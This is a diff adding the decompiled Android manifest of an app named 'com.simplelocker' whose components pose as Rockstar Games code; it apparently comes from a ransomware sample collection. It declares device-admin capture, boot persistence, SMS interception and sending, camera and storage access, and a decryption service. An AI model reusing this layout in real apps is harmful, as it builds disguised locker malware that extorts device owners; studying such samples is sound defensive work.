@@ -1,0 +1,163 @@
+<?xml version="1.0" ?>
+<manifest android:installLocation="0" android:versionCode="1" android:versionName="1.0" package="com.simplelocker" platformBuildVersionCode="20" platformBuildVersionName="4.4W.2-1537038" xmlns:android="http://schemas.android.com/apk/res/android">
+	
+
+	<uses-sdk android:minSdkVersion="9" android:targetSdkVersion="17">
+</uses-sdk>
+	
+
+	<uses-permission android:name="android.permission.INTERNET">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.READ_PHONE_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.WAKE_LOCK">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.RECEIVE_SMS">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.CAMERA">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.SEND_SMS">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.READ_SMS">
+</uses-permission>
+	
+
+	<application android:allowBackup="false" android:icon="@7F020001" android:label="@7F060000">
+		
+
+		<activity android:configChanges="0x000000A0" android:launchMode="1" android:name="com.Rockstargames.Main" android:screenOrientation="1">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="android.intent.action.MAIN">
+</action>
+				
+
+				<category android:name="android.intent.category.LAUNCHER">
+</category>
+				
+
+			</intent-filter>
+			
+
+		</activity>
+		
+
+		<activity android:name="com.Rockstargames.DeviceAdminChecker">
+</activity>
+		
+
+		<receiver android:name="com.Rockstargames.MyDeviceAdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="android.app.action.DEVICE_ADMIN_ENABLED">
+</action>
+				
+
+			</intent-filter>
+			
+
+			<meta-data android:name="android.app.device_admin" android:resource="@7F040000">
+</meta-data>
+			
+
+		</receiver>
+		
+
+		<receiver android:enabled="true" android:exported="true" android:name="com.Rockstargames.ServiceStarter">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="android.intent.action.BOOT_COMPLETED">
+</action>
+				
+
+			</intent-filter>
+			
+
+		</receiver>
+		
+
+		<receiver android:enabled="true" android:exported="true" android:name="com.Rockstargames.SDCardServiceStarter">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE">
+</action>
+				
+
+			</intent-filter>
+			
+
+		</receiver>
+		
+
+		<receiver android:enabled="true" android:exported="true" android:name="com.Rockstargames.MessageReceiver">
+			
+
+			<intent-filter android:priority="1000">
+				
+
+				<action android:name="android.provider.Telephony.SMS_RECEIVED">
+</action>
+				
+
+			</intent-filter>
+			
+
+		</receiver>
+		
+
+		<service android:name="com.Rockstargames.MainService">
+</service>
+		
+
+		<service android:name="com.Rockstargames.CheckService">
+</service>
+		
+
+		<service android:name="com.Rockstargames.DecryptService">
+</service>
+		
+
+	</application>
+	
+
+</manifest>
